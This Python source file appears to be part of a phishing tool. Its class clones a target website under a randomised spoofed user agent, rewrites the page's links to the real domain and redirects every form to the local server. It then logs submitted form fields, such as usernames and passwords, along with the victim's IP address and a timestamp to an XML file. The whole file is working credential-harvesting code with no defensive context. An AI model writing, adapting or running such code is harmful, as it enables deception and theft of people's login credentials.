from urllib.parse import unquote, urljoin, urlparse
from datetime import datetime
from http.server import BaseHTTPRequestHandler
import dict2xml, json
import requests, re, random
from bs4 import BeautifulSoup
from urllib import parse

USER_AGENT = [
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
    "Chrome/15.0.860.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/15.0.860.0"
]

class Rod(BaseHTTPRequestHandler):
    def __init__(self, url, uagent, config):
        self.config = config
        self.url = url
        if uagent is not None:
            self.uagent = uagent
        else:
            self.uagent = random.choice(USER_AGENT)
        self.file = config['fisher']['output-filename']
        self.html = BeautifulSoup(requests.get(url, headers = {'User-agent': self.uagent }).text, 'html.parser')
        self.ChangeLinks()

    def __call__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def ChangeLinks(self):
        domain = '{uri.scheme}://{uri.netloc}/'.format(uri=urlparse(self.url))
        for allLinks in self.html.find_all(href=True):
            if allLinks['href'] and not allLinks['href'].startswith("http") and not allLinks['href'].startswith("jav"):
                allLinks['href'] = f"{domain}{allLinks['href']}"

        for allLinks in self.html.find_all(src=True):
            if allLinks['src'] and not allLinks['src'].startswith("http") and not allLinks['src'].startswith("jav"):
                allLinks['src'] = f"{domain}{allLinks['src']}"

        for formAction in self.html.find_all("form"):
            formAction['action'] = "/"

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(self.html.encode())
    
    def log_message(self, format, *args):
        return format

    def SaveTo(self, data):
        dt = datetime.now().strftime("date=\"%d/%m/%y\" time=\"%H:%M:%S\"")
        client = f"client=\"{self.client_address[0]}\""
        if self.config['fisher']['file-type'] == "xml":
            with open(f"{self.file}.xml", "a") as OutputFile:
                xml = dict2xml.dict2xml(data, wrap='domain', indent='   ').replace("<domain>", f"<domain name=\"{urlparse(self.url).netloc}\" {dt} {client} >")
                OutputFile.write(f"{xml}\n\n")
            
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        params = dict(parse.parse_qsl(unquote(self.rfile.read(content_length))))
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(self.html.encode())
        self.SaveTo(params)